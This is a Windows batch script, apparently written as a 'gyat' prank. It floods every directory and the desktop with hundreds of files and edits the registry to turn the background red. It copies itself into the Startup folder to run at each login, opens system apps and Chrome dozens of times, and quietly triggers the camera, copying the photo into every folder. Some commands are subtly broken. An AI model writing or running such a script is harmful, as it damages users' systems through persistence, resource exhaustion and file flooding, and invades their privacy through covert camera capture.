@echo off
setlocal enabledelayedexpansion

:: Set variables
set "gyat_message=gyat"
set "language_code=ru-RU"
set "background_color=255 0 0"
set "picture_count=400"
set "chrome_delay=4"
set "random_file_count=10"

:: Create notepad files in every directory
for /r %%f in (*) do (
    cd "%%~ff"
    for /l %%n in (1 1 %picture_count%) do (
        echo !gyat_message! > "notepad_%%n.txt"
    )
)

:: Change background to red
reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v "Background" /t REG_SZ /d "!background_color!" /f

:: Change Windows language to Russian
control intl.cpl,, /f:"!language_code!"

:: Create notepad files on desktop
cd "%USERPROFILE%\Desktop"
for /l %%n in (1 1 %picture_count%) do (
    echo !gyat_message! > "notepad_%%n.txt"
)

:: Run on startup
copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Play all sound effects
for /r %%f in (*.mp3, *.mp4, *.wav, *.mov) do (
    start "" "%%~ff"
)

:: Open every default Windows app 20 times
for /l %%n in (1 1 20) do (
    start "" "explorer.exe"
    start "" "notepad.exe"
    start "" "calc.exe"
    start "" "mspaint.exe"
    start "" "mstsc.exe"
    start "" "taskmgr.exe"
    start "" "cmd.exe"
)

:: Open Camera app, take a picture, and duplicate it 400 times
start "" "microsoft.windows.camera:"
timeout /t 5
for /l %%n in (1 1 %picture_count%) do (
    copy /y "C:\Users\%USERNAME%\Pictures\Camera Roll\*.jpg" "C:\Users\%USERNAME%\Pictures\Camera Roll\picture_%%n.jpg"
)

:: Put pictures in every directory
for /r %%f in (*) do (
    cd "%%~ff"
    for /l %%n in (1 1 %picture_count%) do (
        copy /y "C:\Users\%USERNAME%\Pictures\Camera Roll\picture_%%n.jpg" ".\"
    )
)

:: Open Google Chrome and search for "what does gyat mean" with a delay
for /l %%n in (1 1 20) do (
    start "" "chrome.exe" "https://www.google.com/search?q=what+does+gyat+mean"
    timeout /t !chrome_delay!
)

:: Generate random files in startup
for /l %%n in (1 1 %random_file_count%) do (
    set /a rand_num=!random%%%1000
    echo !gyat_message! > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\random_%%n_!rand_num!.txt"
)

:: Hide cmd window
if not "%1" == "hidden" (
    start "" /min cmd /c "%~f0" hidden
    exit
)
